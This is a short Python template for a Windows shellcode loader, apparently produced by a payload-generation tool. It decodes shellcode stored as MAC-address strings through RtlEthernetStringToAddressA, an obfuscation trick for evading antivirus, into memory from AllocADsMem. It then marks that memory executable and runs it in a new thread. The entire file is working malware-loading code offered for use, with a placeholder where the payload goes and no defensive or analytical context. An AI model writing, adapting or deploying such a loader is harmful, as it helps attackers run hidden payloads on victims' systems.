import ctypes
from ctypes import *
from ctypes.wintypes import *

SIZE_T = c_ulonglong
PDWORD = POINTER(DWORD)
list = ${sh3llc0de_m}
pttr = ctypes.windll.Activeds.AllocADsMem(len(list) * 6)
rwxpage = pttr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6
ctypes.windll.kernel32.VirtualProtect.argtypes = (LPVOID,SIZE_T,DWORD,PDWORD)
s = ctypes.windll.kernel32.VirtualProtect(pttr, len(list) * 6, 0x40, PDWORD(c_int(1)))
hanndle = ctypes.windll.kernel32.CreateThread(0, 0, pttr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(hanndle, -1)